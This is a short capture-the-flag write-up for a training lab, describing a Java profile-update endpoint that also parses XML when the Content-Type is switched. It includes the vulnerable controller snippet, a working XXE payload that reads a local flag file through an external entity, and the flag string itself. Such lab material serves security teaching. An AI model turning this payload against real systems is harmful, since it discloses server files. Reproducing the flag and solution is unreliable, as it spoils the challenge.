# Level 3 — Content-Type Switch XXE

## Challenge Description

This challenge simulates a user profile update feature. The frontend submits JSON, but the backend also accepts XML. Attackers simply switch Content-Type to XML and submit malicious XML to trigger XXE.

**Objective**: Discover the hidden XML support, craft an XXE payload to capture the Flag.

## Vulnerability Analysis

Endpoint: `POST /api/challenge/xxe/level3/profile/update`

**Key Code**:

```java
@PostMapping(value = "/profile/update", consumes = {"application/json", "application/xml", "text/xml"})
if (contentType.contains("xml")) {
    profile = parseXmlProfile(body);  // XML branch — XXE vulnerability
} else {
    profile = parseJsonProfile(body);  // JSON branch — normal
}
```

**Virtual file**: `/flag/xxe-level3` → Content: `XXE_LEVEL3_CONTENT_TYPE_2024`

## Walkthrough

### Step 1: Normal JSON Request

```json
Content-Type: application/json
{"username": "alice", "email": "alice@test.com", "bio": "hello"}
```

### Step 2: Switch to XML and Inject

```
Content-Type: application/xml
```

```xml
<?xml version="1.0"?>
<!DOCTYPE profile [
  <!ENTITY xxe SYSTEM "file:///flag/xxe-level3">
]>
<profile>
    <username>&xxe;</username>
    <email>test@test.com</email>
    <bio>test</bio>
</profile>
```

### Step 3: Capture the Flag

When parsed results contain the virtual flag file content, the response includes the Flag.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/xxe/XxeLevel3Controller.java` | Backend profile update, supports both JSON and XML |
| `service/FlagService.java` | Flag retrieval and validation |
